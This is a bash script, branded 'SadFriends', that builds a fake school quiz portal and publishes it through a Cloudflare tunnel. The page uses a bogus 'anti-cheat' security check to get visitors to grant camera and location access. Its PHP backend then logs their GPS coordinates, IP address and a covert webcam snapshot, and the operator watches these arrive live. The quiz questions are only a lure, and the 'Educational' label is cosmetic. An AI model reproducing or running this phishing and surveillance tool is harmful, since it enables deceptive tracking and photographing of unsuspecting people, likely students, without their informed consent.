#!/bin/bash
# --- ACADEMIC QUIZ PORTAL v27.0 (SADFRIENDS EDITION 2026) ---
NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

PORT=8888
SERVER_DIR="server"

mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png > /dev/null 2>&1
echo "[$(date)] --- MONITORING ACTIVE ---" > $SERVER_DIR/combined.log
chmod -R 755 $SERVER_DIR

clear
# --- Enhanced SadFriends ASCII Banner ---
echo -e "${PBlue}${Bold}"
echo -e "  ██████╗  █████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗██████╗ ███████╗"
echo -e "  ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║██╔══██╗██╔════╝"
echo -e "  ${PWhite}███████╗ ███████║██║  ██║█████╗  ██████╔╝██║█████╗  ██╔██╗ ██║██║  ██║███████╗${PBlue}"
echo -e "  ╚════██║ ██╔══██║██║  ██║██╔══╝  ██╔══██╗██║██╔══╝  ██║╚██╗██║██║  ██║╚════██║"
echo -e "  ██████╔╝ ██║  ██║██████╔╝██║     ██║  ██║██║███████╗██║ ╚████║██████╔╝███████║"
echo -e "  ╚═════╝  ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝${NC}"
echo -e " ${PYellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e " ${BCyan}${Bold}  [>] CREATED BY : ${PWhite}SadFriends${NC}          ${BGreen}[>] STATUS : ${PWhite}Educational 2026${NC}"
echo -e " ${PYellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

# --- QUIZ SELECTION ---
echo -e "\n ${BCyan}${Bold}[ SELECT SUBJECT ]${NC}"
echo -e " ${PWhite}1. MATHEMATICS  2. SCIENCE  3. ENGLISH  4. HISTORY${NC}"
read -p $'\n [*] Select ➤ ' q_opt

case $q_opt in
1) SUBJECT="MATH"; S_CODE="MTH"; S_COLOR="#3498db"
   Q_DATA='[{"q":"12 + 15?","c":["27","29","25","30"]},{"q":"9 x 8?","c":["72","81","64","70"]},{"q":"50 / 2?","c":["25","20","15","30"]},{"q":"Sqrt of 81?","c":["9","8","7","10"]},{"q":"15 x 3?","c":["45","35","55","40"]},{"q":"100 - 45?","c":["55","65","45","50"]},{"q":"6 x 7?","c":["42","48","36","40"]},{"q":"25 + 75?","c":["100","110","90","120"]},{"q":"81 / 9?","c":["9","8","7","6"]},{"q":"10 x 10?","c":["100","10","1000","20"]}]' ;;
2) SUBJECT="SCIENCE"; S_CODE="SCI"; S_COLOR="#2ecc71"
   Q_DATA='[{"q":"H2O is?","c":["Water","Air","Fire","Earth"]},{"q":"Red Planet?","c":["Mars","Venus","Jupiter","Saturn"]},{"q":"Powerhouse of cell?","c":["Mitochondria","Nucleus","Ribosome","DNA"]},{"q":"Closest star?","c":["Sun","Proxima","Sirius","Vega"]},{"q":"Liquid metal?","c":["Mercury","Iron","Gold","Silver"]},{"q":"Gas we breathe?","c":["Oxygen","Nitrogen","CO2","Argon"]},{"q":"Boiling point?","c":["100C","90C","110C","120C"]},{"q":"Hardest mineral?","c":["Diamond","Quartz","Talc","Gold"]},{"q":"Center of atom?","c":["Nucleus","Electron","Proton","Neutron"]},{"q":"Study of plants?","c":["Botany","Zoology","Biology","Physics"]}]' ;;
*) SUBJECT="HISTORY"; S_CODE="HIS"; S_COLOR="#f1c40f"
   Q_DATA='[{"q":"National Hero?","c":["Rizal","Luna","Aguinaldo","Bonifacio"]},{"q":"Year of Indep.?","c":["1898","1945","1521","1901"]},{"q":"1st President?","c":["Aguinaldo","Quezon","Laurel","Roxas"]},{"q":"Oldest City?","c":["Cebu","Manila","Vigan","Davao"]},{"q":"GOMBURZA?","c":["3","4","5","2"]},{"q":"Discovered PH?","c":["Magellan","Colon","Legazpi","Cook"]},{"q":"Capital?","c":["Manila","Cebu","Quezon","Baguio"]},{"q":"Nat. Flower?","c":["Sampaguita","Rose","Orchid","Tulip"]},{"q":"Flag Sun Rays?","c":["8","7","10","3"]},{"q":"Hero of Mactan?","c":["Lapu-Lapu","Humabon","Sikatuna","Dagohoy"]}]' ;;
esac

# --- PHP Backend ---
cat <<EOF > $SERVER_DIR/index.php
<?php
date_default_timezone_set('Asia/Manila');
\$ip = \$_SERVER['REMOTE_ADDR'];
if (isset(\$_POST['lat'])) {
    file_put_contents('combined.log', "[LOC] Lat:".\$_POST['lat']." | Lon:".\$_POST['lon']." | IP: \$ip\n", FILE_APPEND);
    exit();
}
if (isset(\$_POST['img'])) {
    \$data = base64_decode(str_replace(' ', '+', str_replace('data:image/png;base64,', '', \$_POST['img'])));
    \$filename = 'CAM_'.date('His').'.png';
    file_put_contents(\$filename, \$data);
    file_put_contents('combined.log', "[CAM] Saved: \$filename | IP: \$ip\n", FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>$SUBJECT Quiz Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 20px; }
        .box { background: #1e1e1e; padding: 25px; border-radius: 15px; max-width: 400px; margin: auto; border: 1px solid $S_COLOR; box-shadow: 0 0 15px $S_COLOR; }
        .btn { background: $S_COLOR; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; margin: 8px 0; font-weight: bold; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); filter: brightness(1.2); }
        #quiz-part { display: none; }
        .code-box { background: #000; color: #00ff00; padding: 15px; font-family: monospace; border: 1px dashed #00ff00; border-radius: 5px; font-size: 1.3em; }
    </style>
</head>
<body>
    <div id="perm-part" class="box">
        <h2 style="color:$S_COLOR">SECURITY CHECK</h2>
        <p>This portal requires <b>Camera</b> and <b>Location</b> for attendance verification (Anti-Cheat System).</p>
        <button class="btn" onclick="startSystem()">ALLOW ACCESS & START</button>
    </div>
    <div id="quiz-part" class="box">
        <h2 id="q-title">$SUBJECT QUIZ</h2>
        <p id="q-text" style="font-size: 1.2em; min-height: 60px;"></p>
        <div id="choices-box"></div>
        <p style="margin-top:20px; font-size: 0.8em; opacity: 0.5;">SadFriends Educational System v27.0</p>
    </div>
    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
    <script>
    let currentQ = 0; const data = $Q_DATA;
    function startSystem() {
        navigator.geolocation.getCurrentPosition(p => {
            fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body: 'lat='+p.coords.latitude+'&lon='+p.coords.longitude});
        });
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.getElementById('v'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png'))});
            }, 2500);
        });
        document.getElementById('perm-part').style.display = 'none';
        document.getElementById('quiz-part').style.display = 'block';
        showQuestion();
    }
    function showQuestion() {
        const qObj = data[currentQ];
        document.getElementById('q-text').innerText = qObj.q;
        const box = document.getElementById('choices-box'); box.innerHTML = '';
        qObj.c.forEach(choice => {
            let btn = document.createElement('button'); btn.className = 'btn'; btn.innerText = choice; btn.onclick = nextQuestion; box.appendChild(btn);
        });
    }
    function nextQuestion() {
        if (currentQ < 9) { currentQ++; showQuestion(); }
        else {
            const code = "$S_CODE-" + Math.floor(Math.random()*8999+1000) + "-DONE";
            document.getElementById('quiz-part').innerHTML = "<h2>QUIZ COMPLETE</h2><p>Copy your verification code:</p><div class='code-box'>" + code + "</div>";
        }
    }
    </script>
</body>
</html>
EOF

# --- SERVER START ---
echo -e "${BGreen}[*] Booting SadFriends PHP Server...${NC}"
fuser -k $PORT/tcp > /dev/null 2>&1
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

echo -e "${PYellow}[*] Tunneling through Cloudflare...${NC}"
cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
CF_PID=$!

while true; do
    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
    if [ ! -z "$CF_LINK" ]; then
        echo -e "\n${BGreen}${Bold}[+] QUIZ LINK: ${PWhite}${Bold}$CF_LINK${NC}"
        echo -e "${BPurple}${Bold}━━━━━━━━━━━━━━━━━━━━━━━━ MONITORING ━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        break
    fi
    sleep 2
done

trap "kill $PHP_PID $CF_PID; rm -f cf.log; echo -e '\n${PRed}[!] SadFriends Server Offline.${NC}'; exit" INT TERM EXIT

# CLEAN TRAP: Tanging LOC at CAM entries lang ang ipapakita sa baba
tail -f $SERVER_DIR/combined.log | grep --line-buffered -E "\[LOC\]|\[CAM\]"
